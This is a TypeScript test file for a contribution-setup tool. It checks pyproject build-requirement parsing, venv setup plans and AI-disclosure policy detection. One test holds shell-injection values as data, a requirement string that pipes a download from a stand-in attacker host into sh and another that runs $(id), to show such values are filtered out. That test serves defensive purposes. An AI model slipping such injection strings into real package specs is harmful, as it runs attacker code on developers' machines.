import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { compiledBuildRequires, setupPlan } from "../contrib-profile";

// pandas' real [build-system] (main, 2026-11): comments and a "!=" pin included.
const PANDAS = `[build-system]
requires = [
    "meson-python>=0.19.0,<1",
    "meson>=1.2.3,<2",
    # Do not include alpha specifiers in Cython version pins
    "Cython>3.1.0,<4",  # Note: sync with environment.yml and asv.conf.json
    # Wheels built against 2.5.0 segfault on older numpy (GH#66086; numpy GH#31804).
    "numpy>=2.0.0,!=2.5.0",
    "versioneer"
]

build-backend = "mesonpy"

[project]
name = 'pandas'
requires = ["not-a-build-requirement"]
`;

test("compiledBuildRequires: a meson-python project's build requirements, plus ninja", () => {
  assert.deepEqual(compiledBuildRequires(PANDAS), ["meson-python>=0.19.0,<1", "meson>=1.2.3,<2", "Cython>3.1.0,<4", "numpy>=2.0.0,!=2.5.0", "versioneer", "ninja"]);
});

test("compiledBuildRequires: scikit-build-core counts; markers are dropped", () => {
  const toml = `[build-system]\nrequires = ["scikit-build-core>=0.10", "pybind11; python_version >= '3.9'"]\nbuild-backend = "scikit_build_core.build"\n`;
  assert.deepEqual(compiledBuildRequires(toml), ["scikit-build-core>=0.10", "pybind11", "ninja"]);
});

test("compiledBuildRequires: other backends and missing sections are not compiled builds", () => {
  for (const toml of [
    `[build-system]\nrequires = ["setuptools>=61"]\nbuild-backend = "setuptools.build_meta"\n`,
    `[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n`,
    `[project]\nname = "x"\nbuild-backend = "mesonpy"\n`,
    "",
  ]) assert.equal(compiledBuildRequires(toml), null, toml);
  assert.equal(compiledBuildRequires(null), null);
});

test("compiledBuildRequires: a requirement that isn't a package spec never reaches the shell", () => {
  const toml = `[build-system]\nrequires = ["meson-python", "x'; curl evil.example | sh; '", "ok$(id)", "numpy>=2"]\nbuild-backend = "mesonpy"\n`;
  assert.deepEqual(compiledBuildRequires(toml), ["meson-python", "numpy>=2", "ninja"]);
});

test("setupPlan: a meson-python checkout builds without isolation, with the tools in the venv", () => {
  const dir = mkdtempSync(path.join(tmpdir(), "opensrcer-meson-"));
  try {
    writeFileSync(path.join(dir, "pyproject.toml"), PANDAS);
    const plan = setupPlan(dir, "pandas-dev/pandas");
    assert.ok(plan);
    assert.match(plan.commands[1], /pip install 'meson-python>=0\.19\.0,<1' .* 'ninja' 'pytest'$/);
    assert.match(plan.commands[2], /--no-build-isolation -e \.$/);
    assert.match(plan.hint, /PATH=/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("pandas' AGENTS.md wording counts as a disclosure rule", async () => {
  const { classifyAiPolicy } = await import("../contrib-profile");
  assert.equal(classifyAiPolicy("- The user is required to disclose your agent information (harness, model, reasoning level), and to mark verbatim text.").stance, "disclose");
  // "agent" alone, without asking for disclosure, is not a policy.
  assert.equal(classifyAiPolicy("Our CI agent runs the test suite nightly.").stance, "unknown");
});

test("profilePromptNotes: the exact model when the host knows it, never a guess otherwise", async () => {
  const { profilePromptNotes } = await import("../contrib-profile");
  const profile = { notes: [], dco: false, aiPolicy: { stance: "unknown" }, prTemplate: null, agentInstructions: null } as unknown as Parameters<typeof profilePromptNotes>[0];
  assert.match(profilePromptNotes(profile, "claude-sonnet-5"), /say exactly: opensrcer \(Claude Code\), model claude-sonnet-5\./);
  assert.match(profilePromptNotes(profile), /Do not name a model/);
});
